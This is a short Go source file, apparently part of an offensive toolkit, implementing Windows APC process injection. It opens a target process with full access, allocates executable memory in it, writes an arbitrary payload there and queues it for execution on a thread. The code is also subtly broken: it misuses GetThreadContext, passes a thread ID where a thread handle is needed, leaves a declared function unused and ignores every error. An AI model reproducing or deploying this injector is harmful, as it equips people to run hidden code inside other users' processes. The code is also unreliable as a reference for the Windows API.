package process_injection

import (
"syscall"
"unsafe"
)

type APCInjection struct{}

func NewAPCInjection() *APCInjection {
return &APCInjection{}
}

func (a *APCInjection) Inject(pid int, payload []byte) error {
kernel32 := syscall.NewLazyDLL("kernel32.dll")
procOpenProcess := kernel32.NewProc("OpenProcess")
procVirtualAllocEx := kernel32.NewProc("VirtualAllocEx")
procWriteProcessMemory := kernel32.NewProc("WriteProcessMemory")
procQueueUserAPC := kernel32.NewProc("QueueUserAPC")
procGetThreadContext := kernel32.NewProc("GetThreadContext")
procSetThreadContext := kernel32.NewProc("SetThreadContext")

handle, _, _ := procOpenProcess.Call(0x1F0FFF, 0, uintptr(pid))

addr, _, _ := procVirtualAllocEx.Call(handle, 0, uintptr(len(payload)), 0x3000, 0x40)
var written uintptr
procWriteProcessMemory.Call(handle, addr, uintptr(unsafe.Pointer(&payload[0])), uintptr(len(payload)), uintptr(unsafe.Pointer(&written)))

// Get first thread
var threadId uint32
procGetThreadContext.Call(handle, uintptr(unsafe.Pointer(&threadId)))

procQueueUserAPC.Call(addr, uintptr(threadId), 0)
return nil
}
